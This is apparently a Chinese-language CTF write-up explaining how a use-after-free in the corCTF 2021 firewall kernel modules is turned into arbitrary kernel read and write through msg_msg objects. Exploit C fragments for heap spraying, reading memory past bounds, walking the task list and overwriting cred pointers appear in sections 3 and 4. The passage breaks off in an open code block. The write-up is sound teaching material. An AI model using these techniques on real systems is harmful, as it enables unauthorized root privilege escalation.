> 原文链接: https://www.anquanke.com//post/id/252558 


# Linux内核中利用msg_msg结构实现任意地址读写


                                阅读量   
                                **16504**
                            
                        |
                        
                                                            评论
                                <b>
                                    <a target="_blank">1</a>
                                </b>
                                                                                    



[![](https://p1.ssl.qhimg.com/t01a24379ebf229e2cb.jpg)](https://p1.ssl.qhimg.com/t01a24379ebf229e2cb.jpg)



题目及exp下载 —— [https://github.com/bsauce/CTF/tree/master/corCTF%202021](https://github.com/bsauce/CTF/tree/master/corCTF%202021)

**介绍**：本文示例是来自`corCTF 2021`中 的两个内核题，由 [BitsByWill](https://www.willsroot.io/) 和 [D3v17](https://syst3mfailure.io/) 所出。针对UAF漏洞，漏洞对象从`kmalloc-64`到`kmalloc-4096`，都能利用 `msg_msg` 结构实现任意写。本驱动是基于[NetFilter](https://linux-kernel-labs.github.io/refs/heads/master/labs/networking.html#netfilter)所写，有两个模式，简单模式（对应题目`Fire_of_Salvation`）和复杂模式（对应题目`Wall_of_Perdition`），所用的内核bzImage相同。二者的区别是，简单模式下，`rule_t` 规则结构包含长度 0x800 的字符串成员 `rule_t-&gt;desc`，漏洞对象位于`kmalloc-4k`，复杂模式下`rule_t` 规则 也即漏洞对象位于`kmalloc-64`。

**总结**：如果UAF的漏洞对象是`kmalloc-4096`，就很容易构造重叠的漏洞对象和`msg_msg`结构消息块（都位于`kmalloc-4096`），篡改`msg_msg-&gt;m_ts`和`msg_msg-&gt;next`实现**任意地址读写**。

如果UAF的漏洞对象小于`kmalloc-4096`，例如`kmalloc-64`，则可以先构造重叠的漏洞对象和`msg_msg`结构消息块（都位于`kmalloc-64`），篡改`msg_msg-&gt;m_ts`和`msg_msg-&gt;next`实现**越界读**和**任意地址读**；然后篡改`msg_msg-&gt;next`实现**任意地址释放**，再构造重叠的消息块（位于`kmalloc-4096`的`msg_msgseg`消息和`msg_msg`消息），利用userfault用户页错误处理控制消息写入的时机，篡改`msg_msg-&gt;next`指针指向cred地址，实现**任意地址写**。

注意，调用`msgrcv()`读取内核数据时，如果带上`MSG_COPY`标志，就能避免内核unlink消息，以避免第一次泄露地址时未正确伪造`msg_msg-&gt;m_list.next`和`msg_msg-&gt;m_list.prev`导致unlink时崩溃。

**缓解机制**：如果开启 `CONFIG_SLAB_FREELIST_HARDENED` 或者 在5.11以后的内核版本（开始禁止非特权用户使用userfault），本文的利用技巧就不适用了。前者导致堆喷不确定，后者不能精确控制篡改的时机。

## 1. 漏洞分析

**代码分析**：共5个函数功能，用户通过传入 `user_rule_t` 结构来创建路由规则并存入 `rule_t` 结构中，多条进出处理规则分别存入 `firewall_rules_in` 和 `firewall_rules_out` 全局数组中（每个数组最多存0x80条规则）。
<li>
`firewall_add_rule()`——添加一条规则。`rule_t` 规则结构如下。
<pre><code class="lang-c hljs cpp">typedef struct
`{`
    char iface[16];            // 设备名
    char name[16];            // 规则名
    uint32_t ip;
    uint32_t netmask;
    uint16_t proto;            // 只能是 TCP 或 UDP
    uint16_t port;
    uint8_t action;            // 只能是 DROP 或 ACCEPT
    uint8_t is_duplicated;
    #ifdef EASY_MODE
    char desc[DESC_MAX];
    #endif
`}` rule_t;
</code></pre>
</li>
<li>
`firewall_delete_rule()`——释放规则，并将全局数组上对应的指针清0。</li>
<li>
`firewall_show_rule()`——未实现。</li>
<li>
`firewall_edit_rule()`——编辑规则。</li>
<li>
`firewall_dup_rule()`——复制规则，将`firewall_rules_in` 指针复制到`firewall_rules_out` 数组，或者相反。每条规则只能复制一次，通过`rule_t-&gt;is_duplicated`来记录是否被复制过。漏洞就在这里，**可以先复制规则，再释放规则，导致UAF或double-free，只能写不能读，而且只能UAF写 0x28 – 0x30 字节**。</li>
<li>
`process_rule()`处理规则：（本函数与漏洞利用无关）`nf_register_net_hook()`——[NetFilter hooks](https://wiki.nftables.org/wiki-nftables/index.php/Netfilter_hooks)注册钩子函数。`nf_hook_ops` 是注册的钩子函数的核心结构。本驱动的钩子点是`NF_INET_PRE_ROUTING` 和 `NF_INET_POST_ROUTING`，应该是分别在在路由前和路由后执行钩子函数 `firewall_inbound_hook()` 和 `firewall_outbound_hook()` 函数。钩子函数 `firewall_inbound_hook()` 和 `firewall_outbound_hook()` 函数在收到进出的 `sk_buff` 数据后，分别按照进出规则调用 `process_rule()` 函数来处理数据。
<ul>
- 首先设备名`skb-&gt;dev-&gt;name` 和 `rule_t-&gt;ifaces` 要匹配；
- 如果是进数据，则源ip所属的子网要匹配；如果是出数据，则目的ip所属的子网要匹配；
- 如果是TCP数据包，`rule_t-&gt;port` 要和目标端口匹配，`rule_t-&gt;action` 要为`NF_DROP` 或 `NF_ACCEPT` 接收状态，打印信息。
- 如果是UDP数据包，`rule_t-&gt;port` 要和目标端口匹配，`rule_t-&gt;action` 要为`NF_DROP` 或 `NF_ACCEPT` 接收状态，打印信息。
**漏洞**：只能UAF写 0x28 – 0x30 字节，不能UAF读，因为没有实现`firewall_show_rule()`功能。

**保护机制**：SMAP/SMEP/KPTI, `FG-KASLR`, `SLAB_RANDOM`, `SLAB_HARDENED`, `STATIC_USERMODE_HELPER`。使用SLAB分配器。可以从给出的配置文件中看出，允许`userfaultfd` 调用、`hardened_usercopy`、`CHECKPOINT_RESTORE`。

**利用局限**：
- 由于使用了SLAB分配器，所以chunk上没有 freelist 指针（即便有freelist指针，也不在前0x30用户可控的区域，可能内核把freelist指针后移了）；
<li>
`FG-KASLR`机制会阻碍你覆盖内核结构上的函数指针，例如`sk_buff`结构中的`destructor arg`回调函数指针，多数不在`.text`前面的gadget受到影响；ROP还能用，不过必须先任意读`ksymtab`泄露所在函数的地址；</li>
- 设置`CONFIG_STATIC_USERMODEHELPER`，使得覆盖[`modprobe_path`](https://elixir.bootlin.com/linux/v5.8/source/kernel/kmod.c#L62)或[`core_pattern`](https://elixir.bootlin.com/linux/v5.8/source/fs/coredump.c#L57)的方法不再适用；physmap喷射可用，但是不稳定；综上，绕过SMAP最直接的方法是构造任意读，来读取task双链表，找到当前的task并覆盖cred。
## 2. 内核IPC——msgsnd()与msgrcv()源码分析

**介绍**：内核提供了两个syscall来进行IPC通信， [msgsnd()](https://linux.die.net/man/2/msgsnd) 和 [msgrcv()](https://linux.die.net/man/2/msgrcv)，内核消息包含两个部分，消息头 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构和紧跟的消息数据。长度从`kmalloc-64` 到 `kmalloc-4096`。消息头 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构如下所示。

```
struct msg_msg `{`
    struct list_head m_list;
    long m_type;
    size_t m_ts;        /* message text size */
    struct msg_msgseg *next;
    void *security;        // security指针总为0，因为未开启SELinux
    /* the actual message follows immediately */
`}`;
```

### 2.1 `msgsnd()` 数据发送

**总体流程**：当调用 [msgsnd()](https://linux.die.net/man/2/msgsnd) 来发送消息时，调用 [msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L966) -&gt; [ksys_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L953) -&gt; [do_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L840) -&gt; [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -&gt; [alloc_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L46) 来分配消息头和消息数据，然后调用 [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -&gt; `copy_from_user()` 来将用户数据拷贝进内核。

**示例**：例如，如果想要发送一个包含 0x1fc8 个 `A`的消息，用户态首先调用[msgget()](https://linux.die.net/man/2/msgget) 创建消息队列，然后调用 `msgsnd()`发送数据：

```
[...]

struct msgbuf
`{`
    long mtype;
    char mtext[0x1fc8];
`}` msg;

msg.mtype = 1;
memset(msg.mtext, 'A', sizeof(msg.mtext));

qid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT));
msgsnd(qid, &amp;msg, sizeof(msg.mtext), 0);

[...]
```

**创建消息**： [do_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L840) -&gt; [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -&gt; [alloc_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L46) 。总结，如果消息长度超过0xfd0，则分段存储，采用单链表连接，第1个称为消息头，用 [msg_msg](https://elixir.bootlin.com/linux/v5.8/source/include/linux/msg.h#L9) 结构存储；第2、3个称为segment，用 [msg_msgseg](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L37) 结构存储。消息的最大长度由 `/proc/sys/kernel/msgmax` 确定， 默认大小为 8192 字节，所以最多链接3个成员。

```
static struct msg_msg *alloc_msg(size_t len)
`{`
    struct msg_msg *msg;
    struct msg_msgseg **pseg;
    size_t alen;

    alen = min(len, DATALEN_MSG);                             // [1] len 是用户提供的数据size，本例中为0x1fc8。 DATALEN_MSG = ((size_t)PAGE_SIZE - sizeof(struct msg_msg)) = 0x1000-0x30 = 0xfd0。 本例中 alen = 0xfd0
    msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); // [2] 这里分配 0x1000 堆块，对应 kmalloc-4096
    if (msg == NULL)
        return NULL;

    msg-&gt;next = NULL;
    msg-&gt;security = NULL;

    len -= alen;                                             // [3] 待分配的size，继续分配，用单链表存起来。 len = 0x1fc8-0xfd0 = 0xff8
    pseg = &amp;msg-&gt;next;
    while (len &gt; 0) `{`
        struct msg_msgseg *seg;

        cond_resched();

        alen = min(len, DATALEN_SEG);                         // [4] DATALEN_SEG = ((size_t)PAGE_SIZE - sizeof(struct msg_msgseg)) = 0x1000-0x8 = 0xff8。 alen = 0xff8
        seg = kmalloc(sizeof(*seg) + alen, GFP_KERNEL_ACCOUNT); // [5] 还是分配 0x1000，位于kmalloc-4096
        if (seg == NULL)
            goto out_err;
        *pseg = seg;                                         // [6] 单链表串起来
        seg-&gt;next = NULL;
        pseg = &amp;seg-&gt;next;
        len -= alen;
    `}`

    return msg;

out_err:
    free_msg(msg);
    return NULL;
`}`
```

**拷贝消息**： [do_msgsnd()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L840) -&gt; [load_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L84) -&gt; `copy_from_user()` 。将消息从用户空间拷贝到内核空间。

```
struct msg_msg *load_msg(const void __user *src, size_t len)
`{`
    struct msg_msg *msg;
    struct msg_msgseg *seg;
    int err = -EFAULT;
    size_t alen;

    msg = alloc_msg(len);                         // [1]
    if (msg == NULL)
        return ERR_PTR(-ENOMEM);

    alen = min(len, DATALEN_MSG);
    if (copy_from_user(msg + 1, src, alen))     // [2] 从用户态拷贝数据，0xfd0字节
        goto out_err;

    for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) `{`
        len -= alen;
        src = (char __user *)src + alen;
        alen = min(len, DATALEN_SEG);
        if (copy_from_user(seg + 1, src, alen)) // [3] 剩下的拷贝到其他segment，0xff8字节
            goto out_err;
    `}`

    err = security_msg_msg_alloc(msg);
    if (err)
        goto out_err;

    return msg;

out_err:
    free_msg(msg);
    return ERR_PTR(err);
`}`
```

**内核消息结构**：

[![](https://p3.ssl.qhimg.com/t01259c2bcb610a3021.png)](https://p3.ssl.qhimg.com/t01259c2bcb610a3021.png)

### 2.2 `msgsrv()` 数据接收

**总体流程**： [msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1265) -&gt; [ksys_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1256) -&gt; [do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090) -&gt; [find_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1066) &amp; [do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) &amp; [free_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169)。 调用 [find_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1066) 来定位正确的消息，将消息从队列中unlink，再调用 [do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) -&gt; [store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150) 来将内核数据拷贝到用户空间，最后调用 [free_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L169) 释放消息。

```
long ksys_msgrcv(int msqid, struct msgbuf __user *msgp, size_t msgsz,
         long msgtyp, int msgflg)
`{`
    return do_msgrcv(msqid, msgp, msgsz, msgtyp, msgflg, do_msg_fill);
`}`

static long do_msgrcv(int msqid, void __user *buf, size_t bufsz, long msgtyp, int msgflg,
           long (*msg_handler)(void __user *, struct msg_msg *, size_t))
`{`        // 注意：msg_handler 参数实际指向 do_msg_fill() 函数
    int mode;
    struct msg_queue *msq;
    struct ipc_namespace *ns;
    struct msg_msg *msg, *copy = NULL;
    DEFINE_WAKE_Q(wake_q);
    ... ...
    if (msgflg &amp; MSG_COPY) `{`
        if ((msgflg &amp; MSG_EXCEPT) || !(msgflg &amp; IPC_NOWAIT))
            return -EINVAL;
        copy = prepare_copy(buf, min_t(size_t, bufsz, ns-&gt;msg_ctlmax)); // [4]
        if (IS_ERR(copy))
            return PTR_ERR(copy);
    `}`
    mode = convert_mode(&amp;msgtyp, msgflg);

    rcu_read_lock();
    msq = msq_obtain_object_check(ns, msqid);
    ... ...
    for (;;) `{`
        struct msg_receiver msr_d;

        msg = ERR_PTR(-EACCES);
        if (ipcperms(ns, &amp;msq-&gt;q_perm, S_IRUGO))
            goto out_unlock1;

        ipc_lock_object(&amp;msq-&gt;q_perm);

        /* raced with RMID? */
        if (!ipc_valid_object(&amp;msq-&gt;q_perm)) `{`
            msg = ERR_PTR(-EIDRM);
            goto out_unlock0;
        `}`

        msg = find_msg(msq, &amp;msgtyp, mode);     // [1] 调用 find_msg() 来定位正确的消息。之后检查并unlink消息。
        if (!IS_ERR(msg)) `{`
            /*
             * Found a suitable message.
             * Unlink it from the queue.
             */
            if ((bufsz &lt; msg-&gt;m_ts) &amp;&amp; !(msgflg &amp; MSG_NOERROR)) `{`
                msg = ERR_PTR(-E2BIG);
                goto out_unlock0;
            `}`
            /*
             * If we are copying, then do not unlink message and do
             * not update queue parameters.
             */
            if (msgflg &amp; MSG_COPY) `{`
                msg = copy_msg(msg, copy);         // [5] 若设置了MSG_COPY，则跳出循环，避免unlink
                goto out_unlock0;
            `}`

            list_del(&amp;msg-&gt;m_list);
            ... ...
    `}`

out_unlock0:
    ipc_unlock_object(&amp;msq-&gt;q_perm);
    wake_up_q(&amp;wake_q);
out_unlock1:
    rcu_read_unlock();
    if (IS_ERR(msg)) `{`
        free_copy(copy);
        return PTR_ERR(msg);
    `}`

    bufsz = msg_handler(buf, msg, bufsz);     // [2] 调用 do_msg_fill() 把消息从内核拷贝到用户。具体代码如下所示
    free_msg(msg);                             // [3] 拷贝完成后，释放消息。

    return bufsz;
`}`
```

**消息拷贝**： [do_msg_fill()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1018) -&gt; [store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150) 。和创建消息的过程一样，先拷贝消息头（`msg_msg`结构对应的数据），再拷贝segment（`msg_msgseg`结构对应的数据）。

```
static long do_msg_fill(void __user *dest, struct msg_msg *msg, size_t bufsz)
`{`
    struct msgbuf __user *msgp = dest;
    size_t msgsz;

    if (put_user(msg-&gt;m_type, &amp;msgp-&gt;mtype))
        return -EFAULT;

    msgsz = (bufsz &gt; msg-&gt;m_ts) ? msg-&gt;m_ts : bufsz;     // [1] 检查请求的数据长度是否大于 msg-&gt;m_ts ，超过则只能获取 msg-&gt;m_ts 长度的数据（为了避免越界读）。本例中，msgsz 为0x1fc8字节，
    if (store_msg(msgp-&gt;mtext, msg, msgsz))             // [2] 最后调用 store_msg()将 msgsz也即0x1fc8字节拷贝到用户空间，代码如下所示
        return -EFAULT;
    return msgsz;
`}`

int store_msg(void __user *dest, struct msg_msg *msg, size_t len)
`{`
    size_t alen;
    struct msg_msgseg *seg;

    alen = min(len, DATALEN_MSG);                 // [1] 和创建消息的过程一样，alen=0xfd0
    if (copy_to_user(dest, msg + 1, alen))         // [2] 先拷贝消息头
        return -1;

    for (seg = msg-&gt;next; seg != NULL; seg = seg-&gt;next) `{` // [3] 遍历其他segment
        len -= alen;
        dest = (char __user *)dest + alen;
        alen = min(len, DATALEN_SEG);             // [4] 本例中为0xff8
        if (copy_to_user(dest, seg + 1, alen))     // [5] 再拷贝segment
            return -1;
    `}`
    return 0;
`}`
```

**消息释放**：[store_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L150) 。先释放消息头，再释放segment。

```
void free_msg(struct msg_msg *msg)
`{`
    struct msg_msgseg *seg;

    security_msg_msg_free(msg);

    seg = msg-&gt;next;
    kfree(msg);              // [1] 释放 msg_msg
    while (seg != NULL) `{`     // [2] 释放 msg_msgseg
        struct msg_msgseg *tmp = seg-&gt;next;

        cond_resched();
        kfree(seg);         // [3]
        seg = tmp;
    `}`
`}`
```

**[MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)**：见 [do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090) 中 `[4]`处，如果用flag [MSG_COPY](https://elixir.bootlin.com/linux/v5.8/source/include/uapi/linux/msg.h#L15)来调用 `msgrcv()` （内核编译时需配置`CONFIG_CHECKPOINT_RESTORE`选项，默认已配置），就会调用 [prepare_copy()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1037) 分配临时消息，并调用 [copy_msg()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msgutil.c#L118) 将请求的数据拷贝到该临时消息（见 [do_msgrcv()](https://elixir.bootlin.com/linux/v5.8/source/ipc/msg.c#L1090) 中 `[5]`处）。在将消息拷贝到用户空间之后，原始消息会被保留，不会从队列中unlink，然后调用`free_msg()`删除该临时消息，这对于利用很重要。

为什么？因为本漏洞在第一次UAF的时候，没有泄露正确地址，所以会破坏`msg_msg-&gt;m_list`双链表指针，unlink会触发崩溃。本题的UAF会破坏前16字节，如果某漏洞可以跳过前16字节，是否不需要注意这一点？

```
void *memdump = malloc(0x1fc8);
msgrcv(qid, memdump, 0x1fc8, 1, IPC_NOWAIT | MSG_COPY | MSG_NOERROR);
```

## 3. Fire of Salvation 简单模式利用

**特点**：大小为`kmalloc-4096`的UAF。

**任意读**：`hardened_usercopy` 机制不允许修改size越界读写。可利用UAF篡改`msg_msg-&gt;m_ts`和`msg_msg-&gt;next`（指向的下一个segment前8字节必须为null，避免遍历消息时出现访存崩溃）。

**任意写**：创建一个需要多次分配堆块的消息（&gt;0xfd0），在拷贝消息头（`msg_msg`结构）的时候利用userfault进行挂起，然后利用UAF篡改`msg_msg-&gt;next`指向目标地址，目标地址的前8字节必须为NULL（避免崩溃），解除挂起后就能实现任意写。任意写的原理如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t011bcfbe616e6d2f55.png)

### <a class="reference-link" name="3.1%20%E6%AD%A5%E9%AA%A41%E2%80%94%E2%80%94%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9F%BA%E5%9D%80"></a>3.1 步骤1——泄露内核基址

**泄露内核基址**：由于开启了`FG-KASLR`，只能喷射大量[shm_file_data](https://elixir.bootlin.com/linux/v5.8/source/ipc/shm.c#L74)对象（kmalloc-32）来泄露地址，因为`FG-KASLR`是在boot时对函数和某些节进行二次随机化，而`shm_file_data-&gt;ns`这种指向全局结构的指针不会被二次随机化。我们可以传入消息来分配1个`kmalloc-4096`的消息头和1个`kmalloc-32`的segment，然后**利用UAF改大`msg_msg-&gt;m_ts`，调用`msgrcv()`读内存**，这样就能越界读取多个`kmalloc-32`结构，泄露地址。注意，需使用`MSG_COPY` flag避免unlink时崩溃。原理如下图所示：

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t011ca3410251e12ba3.png)

### <a class="reference-link" name="3.2%20%E6%AD%A5%E9%AA%A42%E2%80%94%E2%80%94%E6%B3%84%E9%9C%B2cred%E5%9C%B0%E5%9D%80"></a>3.2 步骤2——泄露cred地址

**泄露cred地址**：再次利用任意读，从`init_task`开始找到当前进程的`task_struct`（也可以调用 prctl `SET_NAME`来设置`comm`成员，以此标志来暴搜，详见 [Google CTF Quals 2021 Fullchain writeup](https://ptr-yudai.hatenablog.com/entry/2021/07/26/225308)）。本题提供了vmlinux符号信息，`task_struct-&gt;tasks`偏移是0x398，该位置的前8字节为null，可以当作1个segment；`real_cred`和`cred`指针在偏移0x538和0x540处，前面8字节也是null。**利用UAF改大`msg_msg-&gt;m_ts`，将`msg_msg-&gt;next`改为`&amp;task_struct+0x298-8`，调用`msgrcv()`读内存**。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p0.ssl.qhimg.com/t0164d8d2673763abdc.png)

### 3.3 步骤3——篡改`cred &amp; real_cred`指针

**篡改`cred &amp; real_cred`指针**：根据pid找到当前进程后，**利用UAF篡改`msg_msg-&gt;next`指向`&amp;real_cred-0x8`，调用`msgsnd()`写内存**，即可将`real_cred`和`cred`指针替换为`init_cred`即可提权。

[![](https://p5.ssl.qhimg.com/t0186d90daf1223ae93.png)](https://p5.ssl.qhimg.com/t0186d90daf1223ae93.png)

[![](https://p0.ssl.qhimg.com/t01105ff5db7f33ac78.png)](https://p0.ssl.qhimg.com/t01105ff5db7f33ac78.png)

## 4. Wall of Perdition 复杂模式利用

**特点**：大小为`kmalloc-64`的UAF。

**现有的任意写、任意释放技术**： [Four Bytes of Power: Exploiting CVE-2021-26708 in the Linux kernel](https://a13xp0p0v.github.io/2021/02/09/CVE-2021-26708.html) 中介绍了如何伪造`msg_msg-&gt;m_ts`来实现任意写，也通过`msg_msg-&gt;security`指针实现了任意释放，但是本题关闭了SELinux，则`msg_msg-&gt;security`指针总是指向NULL，本题不适用。

### 4.1 步骤1——越界读泄露内核基址、`msg_msg-&gt;m_list.next / prev`

**创建2个消息队列**：

```
[...]

void send_msg(int qid, int size, int c)
`{`
    struct msgbuf
    `{`
        long mtype;
        char mtext[size - 0x30];
    `}` msg;

    msg.mtype = 1;
    memset(msg.mtext, c, sizeof(msg.mtext));

    if (msgsnd(qid, &amp;msg, sizeof(msg.mtext), 0) == -1)
    `{`
        perror("msgsnd");
        exit(1);
    `}`
`}`

[...]

// [1] 先调用msgget()创建两个队列，第一个标记为QID #0，第二个标记为QID #1。
if ((qid[0] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
`{`
    perror("msgget");
    exit(1);
`}`

if ((qid[1] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) == -1)
`{`
    perror("msgget");
    exit(1);
`}`

// [2] 调用 add_rule() 向firewall_rules_in添加inbound规则，再调用 duplicate_rule() 复制到 firewall_rule_out，释放后还能从 firewall_rule_out[1] 访问，触发UAF
add_rule(0, buff, INBOUND);
duplicate_rule(0, INBOUND);
delete_rule(0, INBOUND);

send_msg(qid[0], 0x40, 'A'); // [3] 调用send_msg()，也即对msgsnd()的包装函数，分配3个消息。第1个大小为0x40, 位于队列 QID #0, 由于和刚刚释放的rule位于同一个kmalloc-64，所以能修改该消息的msg_msg头结构。
send_msg(qid[1], 0x40, 'B'); // [4] 第2个消息在队列QID #1中，大小为0x40字节
send_msg(qid[1], 0x1ff8, 0); // [5] 第3个消息在队列QID #1中，大小为0x1ff8字节

[...]
```

**消息布局**： **QID #0** 消息队列——橘色部分是第1个消息，堆块大小0x40，可通过 `edit_rule()` 完全控制。 **QID #1**消息队列——第1个消息，堆块大小为0x40，其 `msg_msg-&gt;m_list.prev` 指向消息队列 **QID #1**，`m_list.next`指向第2个消息，占两个`kmalloc-4096`。

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01bdf9674c46fb92a7.png)

**泄露内存**：**利用UAF改大 QID #0 队列的消息`msg_msg-&gt;m_ts`，调用`msgrcv()`越界读取** **QID #0** 队列的第1个消息，`m_list.next` （指向下一个消息 `kmalloc-4096`）和 `m_list.prev` （指向**`QID #1`**队列），最后我们还能泄露 [`sysfs_bin_kfops_ro`](https://elixir.bootlin.com/linux/v5.8/source/fs/sysfs/file.c#L226)，由于该符号位于内核的data节，所以不受FG-KASLR保护的影响，所以可以用来计算内核基址。

```
[...]

void *recv_msg(int qid, size_t size)
`{`
    void *memdump = malloc(size);

    if (msgrcv(qid, memdump, size, 0, IPC_NOWAIT | MSG_COPY | MSG_NOERROR) == -1)
    `{`
        perror("msgrcv");
        return NULL;
    `}`

    return memdump;
`}`

[...]

uint64_t *arb_read(int idx, uint64_t target, size_t size, int overwrite)
`{`
    struct evil_msg *msg = (struct evil_msg *)malloc(0x100);

    msg-&gt;m_type =  0;
    msg-&gt;m_ts = size;                         // [2] 调用edit_rule()覆盖目标对象的 m_ts 域

    if (overwrite)
    `{`
        msg-&gt;next = target;
        edit_rule(idx, (unsigned char *)msg, OUTBOUND, 0);
    `}`
    else
    `{`
        edit_rule(idx, (unsigned char *)msg, OUTBOUND, 1); // [3]
    `}`

    free(msg);

    return recv_msg(qid[0], size);             // [4] 调用 recv_msg(),也即msgrcv()的包装函数,注意使用 MSG_COPY flag, 就能泄露内存。由于我们破坏了 m_list.next 和 m_list.prev 指针，所以如果不使用 MSG_COPY flag 的话，do_msgrcv() 就会 unlink message，导致出错崩溃。
`}`

[...]

uint64_t *leak = arb_read(0, 0, 0x2000, 0); // [1] 调用 arb_read(), 参数0x2000

[...]
```

[![](https://p3.ssl.qhimg.com/t01a9c4453a98df5f6a.png)](https://p3.ssl.qhimg.com/t01a9c4453a98df5f6a.png)

### <a class="reference-link" name="4.2%20%E6%AD%A5%E9%AA%A42%E2%80%94%E2%80%94%E8%B6%8A%E7%95%8C%E8%AF%BB%E5%88%B0%E4%BB%BB%E6%84%8F%E8%AF%BB%EF%BC%8C%E6%B3%84%E9%9C%B2%E5%BD%93%E5%89%8D%E8%BF%9B%E7%A8%8B%E7%9A%84cred%E5%9C%B0%E5%9D%80"></a>4.2 步骤2——越界读到任意读，泄露当前进程的cred地址

**思路**：根据`sysfs_bin_kfops_ro` 地址可计算出内核基址，得到[init_task](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched/task.h#L48)的地址，即系统执行的第一个进程的 [task_struct](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L629) 结构。 [task_struct](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L629) 中有3个成员很重要：[tasks](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L734) 包含指向前后 `task_struct`的指针（偏移0x298），[pid](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L804) 进程号（偏移0x398），[cred](https://elixir.bootlin.com/linux/v5.8/source/include/linux/sched.h#L894) 进程的凭证（偏移0x540）。

exp中，我们调用 `find_current_task()` 来遍历所有的task [1]，从`init_task`开始找到当前进程的`task_struct` [2]，`find_current_task()`多次调用 `arb_read()`，**利用UAF篡改`msg_msg-&gt;m_ts` 和`msg_msg-&gt;next`指针，调用`msgrcv()`**泄露出指向下一个task的`tasks-&gt;next`指针 [3] 和 `PID` [4]，然后直到找到当前task。

```
[...]

uint64_t find_current_task(uint64_t init_task)
`{`
    pid_t pid, next_task_pid;
    uint64_t next_task;

    pid = getpid();

    printf("[+] Current task PID: %d\n", pid);
    puts("[*] Traversing tasks...");

    leak = arb_read(0, init_task + 8, 0x1500, 1) + 0x1f9;
    next_task = leak[0x298/8] - 0x298;

    leak = arb_read(0, next_task + 8, 0x1500, 1) + 0x1f9;
    next_task_pid = leak[0x398/8];

    while (next_task_pid != pid)             // [2]
    `{`
        next_task = leak[0x298/8] - 0x298;     // [3]
        leak = arb_read(0, next_task + 8, 0x2000, 1) + 0x1f9;
        next_task_pid = leak[0x398/8];         // [4]
    `}`

    puts("[+] Current task found!");

    return next_task;
`}`

[...]

puts("[*] Locating current task address...");
uint64_t current_task = find_current_task(init_task); // [1]
printf("[+] Leaked current task address: 0x%lx\n", current_task);

[...]
```

**具体**：篡改 `msg_msg-&gt;m_ts` 为0x2000，篡改 `msg_msg-&gt;next`指针指向 `task_struct`结构（注意头8字节为null），遍历双链表直到读取到当前进程的`task_struct`。同理泄露当前进程的`cred`地址。

```
[...]

